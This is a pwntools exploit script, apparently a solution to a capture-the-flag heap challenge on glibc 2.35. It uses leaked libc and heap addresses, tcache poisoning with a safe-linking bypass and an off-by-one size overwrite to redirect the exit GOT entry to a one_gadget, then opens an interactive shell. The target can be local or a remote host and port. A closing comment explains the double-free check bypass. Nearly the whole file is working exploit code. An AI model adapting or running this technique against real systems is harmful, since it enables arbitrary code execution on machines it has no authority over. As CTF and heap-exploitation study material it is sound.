from pwn import *
import sys
import time

context.log_level = "debug"


# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i)
        for i in __import__("subprocess")
        .check_output(["one_gadget", "--raw", filename])
        .decode()
        .split(" ")
    ]


# brva x = b *(pie+x)
# set follow-fork-mode
if len(sys.argv) == 1:
    r = process("./chal")
    if args.GDB:
        gdb.attach(
            r,
            'set exec-wrapper env "LD_PRELOAD=./libc.so.6"\nset debug-file-directory /usr/src/glibc/glibc-2.35\ndirectory /usr/src/glibc/glibc-2.35/malloc/\nb *0x000000000040138b\nb *0x0000000000401386',
        )
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)


def malloc(content):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"> ", str(len(content)).encode())
    r.sendlineafter(b"> ", content)


def free(idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"> ", str(idx).encode())


r.sendlineafter(b"hero?\n", b"y")
r.recvuntil(b"Take this: ")
setvbuf = int(r.recvline().decode().strip(), 16)
print(f"setvbuf: {hex(setvbuf)}")
libc = setvbuf - 0x0000000000081670
print(f"libc: {hex(libc)}")
system = libc + 0x0000000000050D60
print(f"system: {hex(system)}")
r.recvuntil(b"And this: ")
heap_leak = int(r.recvline().decode().strip(), 16)
malloc(b"A" * 0xF0)  # Chunk 0
malloc(b"A" * 0x28)  # Chunk 1
free(0)
free(1)
malloc(b"A" * 0x120)  # Chunk 2
free(2)
bin_sh_chunk = b"/bin/sh\x00"
bin_sh_chunk += b"A" * (0x28 - len(bin_sh_chunk))
malloc(bin_sh_chunk)  # Chunk 3
free(2)
malloc(b"A" * 0x120)  # Chunk 4
free(4)
# r.interactive()
exit_got = (
    0x0000000000404058 - 0x8
)  # We need last byte to be 0, I figure out edit this will control RIP immediately.
poisoned_chunk = p64(exit_got ^ ((heap_leak + 0x50) >> 12)) + b"A" * (
    0xF0 - 8
)  # Encryption bypass
malloc(poisoned_chunk)  # Chunk 5
# r.interactive()
# r.interactive()
malloc(b"A" * 0xF0)  # Chunk 6
# free(5)
# r.interactive()
# Fail some checks so it takes another chunk from arena I think.
# r.interactive()
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"240")
og = [965873, 965877, 965880, 965970, 966056, 966063, 966067]
r.sendlineafter(b"> ", p64(og[5] + libc))
r.recvuntil(b"> ")
print("[+] Shell out.")
r.interactive()
"""
Give you a system leak and heap leak.
tcache 2.29 checkes if key == tcache and there's the same chunk in that size's tcache entry. (2.35 basically the same)
Bypass:
1. Overwrite key to some other value
2. Modify the size.
We use off by one to overwrite the size of the chunk to bypass tcache double free check.
However:
Glibc 2.35
if (tc_idx < mp_.tcache_bins
      && tcache
      && tcache->counts[tc_idx] > 0)
Glibc 2.29
if (tc_idx < mp_.tcache_bins
      /*&& tc_idx < TCACHE_MAX_BINS*/ /* to appease gcc */
      && tcache
      && tcache->entries[tc_idx] != NULL)
So we need an extra chunk in tcache to bypass the counts check.
Now by tcache poisoning, we have arbitrary write. But how to hijack control flow?
Exit hook cannot write... Hooks are removed in new version, including rtld_global_ro._dl_fini, malloc, free is deprecated.
__elf_set___libc_atexit_element__IO_cleanup__ cannot write this version and many other _IO_FILE exploit has been patched.
I don't want to use some dark Chinese technique like House of apple, banana... So I let global offset table is writable.
"""

